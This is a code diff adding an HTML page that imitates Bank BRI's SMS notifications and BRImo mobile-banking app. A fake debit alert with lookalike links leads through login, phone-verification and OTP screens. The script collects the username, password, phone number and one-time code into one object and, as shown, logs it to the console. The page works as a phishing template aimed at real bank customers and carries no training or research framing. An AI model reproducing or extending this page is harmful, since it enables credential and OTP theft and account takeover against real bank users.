@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>BRI-NOTIF UI</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Reset Dasar untuk Android Full Screen */
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #f0f2f5;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        /* Container utama memenuhi seluruh viewport */
+        .screen {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            flex-direction: column;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: #f0f2f5;
+            z-index: 10;
+        }
+
+        /* Bubble Chat Style */
+        .message-bubble {
+            background-color: #e8eaed;
+            border-radius: 8px;
+            position: relative;
+            max-width: 85%;
+            word-wrap: break-word;
+        }
+
+        .blue-link {
+            color: #1a73e8;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .blue-underlined-char {
+            border-bottom: 2px solid #1a73e8;
+        }
+
+        /* Header Style */
+        .app-header {
+            background: white;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #eee;
+            flex-shrink: 0;
+            width: 100%;
+        }
+
+        .date-divider {
+            text-align: center;
+            font-size: 12px;
+            color: #70757a;
+            margin: 15px 0;
+        }
+        
+        /* Area Konten Scrollable */
+        .scroll-content {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding-bottom: 90px;
+            -webkit-overflow-scrolling: touch;
+            width: 100%;
+        }
+
+        /* Area Input Chat */
+        .input-area {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            background: white;
+            padding: 12px;
+            border-top: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 20;
+        }
+
+        .input-box {
+            flex-grow: 1;
+            border: 1px solid #ccc;
+            border-radius: 24px;
+            padding: 10px 18px;
+            color: #999;
+            font-size: 14px;
+            background: #fdfdfd;
+        }
+
+        .send-button {
+            background: transparent;
+            border: none;
+            color: #1a73e8;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            padding: 5px 10px;
+        }
+
+        /* Gaya Layar Autentikasi BRImo */
+        .auth-bg {
+            background: linear-gradient(to bottom, #00529c, #003366);
+            color: white;
+            padding: 60px 24px 30px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        .auth-input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            padding: 16px 18px;
+            margin-bottom: 15px;
+            color: white;
+            outline: none;
+            font-size: 16px;
+            -webkit-appearance: none;
+        }
+
+        .auth-input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .auth-button {
+            width: 100%;
+            background: #f2a900;
+            color: #003366;
+            font-weight: bold;
+            padding: 18px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 16px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .auth-button:active {
+            opacity: 0.9;
+            transform: scale(0.98);
+        }
+
+        /* OTP Input */
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 320px;
+            margin-top: 30px;
+            gap: 8px;
+        }
+
+        .otp-box {
+            width: 45px;
+            height: 55px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            outline: none;
+        }
+
+        /* Loading Overlay */
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            flex-direction: column;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top: 4px solid #f2a900;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Overlay Loading -->
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loading-text" class="font-medium text-lg">Memproses...</p>
+    </div>
+
+    <!-- HALAMAN 1: Chat/Pesan -->
+    <div id="chat-screen" class="screen" style="display: flex;" onclick="showLogin()">
+        <header class="app-header">
+            <div class="flex items-center gap-4">
+                <button class="text-gray-700">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+                    </svg>
+                </button>
+                <h1 class="text-xl font-bold text-gray-800 tracking-tight">BRI-NOTIF</h1>
+            </div>
+            <div class="bg-black p-1 rounded-md">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+        </header>
+
+        <div class="scroll-content">
+            <div class="date-divider">27 Februari</div>
+            <div class="px-4 space-y-6">
+                <div class="flex items-center gap-2">
+                    <div class="message-bubble p-4 shadow-sm text-[15px] text-gray-800">
+                        <p>
+                            <span class="blue-underlined-char">T</span>rx <span class="blue-link">Rek. 471001023289539</span> : 
+                            <span class="blue-underlined-char">T</span>RAN<span class="blue-underlined-char">S</span>AK<span class="blue-underlined-char">S</span>I DEBE<span class="blue-underlined-char">T</span> Rp. 2,500,000.00 27/02/26 14:01:46 Redeem BRI <span class="blue-underlined-char">P</span>oin! Klik 
+                            <span class="blue-link">BRIPoin.bricare.co.id</span>
+                        </p>
+                        <div class="text-right text-[10px] text-gray-500 mt-1">14:02</div>
+                    </div>
+                </div>
+                <div class="flex items-center gap-2">
+                    <div class="message-bubble p-4 shadow-sm text-[15px] text-gray-800">
+                        <p>
+                            <span class="blue-underlined-char">T</span>rx <span class="blue-link">Rek. 471001023289539</span> : 
+                            <span class="blue-underlined-char">T</span>RAN<span class="blue-underlined-char">S</span>AK<span class="blue-underlined-char">S</span>I DEBE<span class="blue-underlined-char">T</span> Rp. 2,500,000.00 27/02/26 14:01:46 
+                            <span class="blue-link">mobilebanking.bricare.co.id</span>
+                        </p>
+                        <div class="text-right text-[10px] text-gray-500 mt-1">14:02</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="input-area">
+            <div class="input-box">Tidak dapat mengirim pesan</div>
+            <button class="send-button">Kirim</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: Login BRImo -->
+    <div id="login-screen" class="screen auth-bg">
+        <div class="mb-12 mt-10">
+            <div class="text-5xl font-black italic tracking-tighter">BRI<span class="text-[#f2a900]">mo</span></div>
+        </div>
+        <div class="w-full space-y-4">
+            <h2 class="text-2xl font-semibold mb-6 text-center">Selamat Datang</h2>
+            <input type="text" id="username" class="auth-input" placeholder="Username" autocomplete="off">
+            <input type="password" id="password" class="auth-input" placeholder="Password" autocomplete="off">
+            <button class="auth-button" onclick="processLogin()">LOGIN</button>
+        </div>
+        <div class="mt-auto mb-10 text-[11px] opacity-40">v.5.12.0 • Perbankan Terpercaya</div>
+    </div>
+
+    <!-- HALAMAN 3: Verifikasi Nomor Telepon -->
+    <div id="security-screen" class="screen auth-bg">
+        <div class="mb-10 mt-10 text-center">
+             <div class="text-4xl font-black italic tracking-tighter mb-8">BRI<span class="text-[#f2a900]">mo</span></div>
+             <h2 class="text-xl font-bold leading-tight uppercase">Keamanan Nasabah</h2>
+             <p class="text-md mt-4 opacity-90 px-4">Masukkan nomor HP yang terdaftar untuk verifikasi akun Anda.</p>
+        </div>
+        <div class="w-full space-y-4 px-2">
+            <input type="tel" id="phone" class="auth-input" placeholder="Nomor Telepon (Contoh: 0812...)" autocomplete="off">
+            <button class="auth-button" onclick="processSecurity()">VERIFIKASI SEKARANG</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 4: Input OTP -->
+    <div id="otp-screen" class="screen auth-bg">
+        <div class="mb-10 mt-10 text-center">
+             <div class="text-4xl font-black italic tracking-tighter mb-8">BRI<span class="text-[#f2a900]">mo</span></div>
+             <h2 class="text-xl font-bold uppercase">Masukkan OTP</h2>
+             <p class="text-md mt-4 opacity-90 px-8">Masukkan 6 digit kode yang dikirim ke SMS Anda.</p>
+        </div>
+        <div class="w-full px-4 flex flex-col items-center">
+            <div class="otp-container">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 0)">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 1)">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 2)">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 3)">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 4)">
+                <input type="tel" maxlength="1" class="otp-box" oninput="moveFocus(this, 5)">
+            </div>
+            <button class="auth-button mt-12" onclick="processOtp()">KONFIRMASI</button>
+            <p class="mt-8 text-sm opacity-70">Belum terima kode? <span class="text-[#f2a900] font-bold">Kirim Ulang</span></p>
+        </div>
+    </div>
+
+    <script>
+        const collectedData = { username: '', password: '', phone: '', otp: '' };
+
+        // Sembunyikan semua layar
+        function hideAll() {
+            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
+        }
+
+        // Tampilkan loading overlay
+        function showLoading(text, callback) {
+            const overlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+            loadingText.innerText = text;
+            overlay.style.display = 'flex';
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                callback();
+            }, 1500);
+        }
+
+        // Navigasi ke Halaman Login
+        function showLogin() {
+            hideAll();
+            document.getElementById('login-screen').style.display = 'flex';
+        }
+
+        // Proses dari Login ke Verifikasi Nomor
+        function processLogin() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if(!u || !p) return alert("Mohon isi username dan password lengkap!");
+            
+            collectedData.username = u;
+            collectedData.password = p;
+            showLoading("Memverifikasi Akun...", () => {
+                hideAll();
+                document.getElementById('security-screen').style.display = 'flex';
+            });
+        }
+
+        // Proses dari Verifikasi Nomor ke OTP
+        function processSecurity() {
+            const ph = document.getElementById('phone').value;
+            if(!ph) return alert("Masukkan nomor HP aktif Anda!");
+            
+            collectedData.phone = ph;
+            showLoading("Mengirim OTP...", () => {
+                hideAll();
+                document.getElementById('otp-screen').style.display = 'flex';
+                document.querySelectorAll('.otp-box')[0].focus();
+            });
+        }
+
+        // Proses Akhir (OTP)
+        function processOtp() {
+            let code = "";
+            document.querySelectorAll('.otp-box').forEach(i => code += i.value);
+            if(code.length < 6) return alert("Masukkan 6 digit kode OTP dengan benar!");
+            
+            collectedData.otp = code;
+            showLoading("Menyinkronkan Data...", () => {
+                console.log("LOG_DATA:", collectedData);
+                alert("Permintaan sedang diproses. Mohon tunggu SMS konfirmasi dari BRI.");
+            });
+        }
+
+        // Fungsi kontrol fokus input OTP
+        function moveFocus(el, idx) {
+            if(el.value && idx < 5) {
+                document.querySelectorAll('.otp-box')[idx + 1].focus();
+            }
+        }
+
+        // Penanganan tombol backspace pada input OTP
+        document.querySelectorAll('.otp-box').forEach((box, index) => {
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !box.value && index > 0) {
+                    document.querySelectorAll('.otp-box')[index - 1].focus();
+                }
+            });
+        });
+
+        // Jalankan Halaman Chat sebagai pembuka
+        window.onload = function() {
+            hideAll();
+            document.getElementById('chat-screen').style.display = 'flex';
+        };
+    </script>
+</body>
+</html>
+
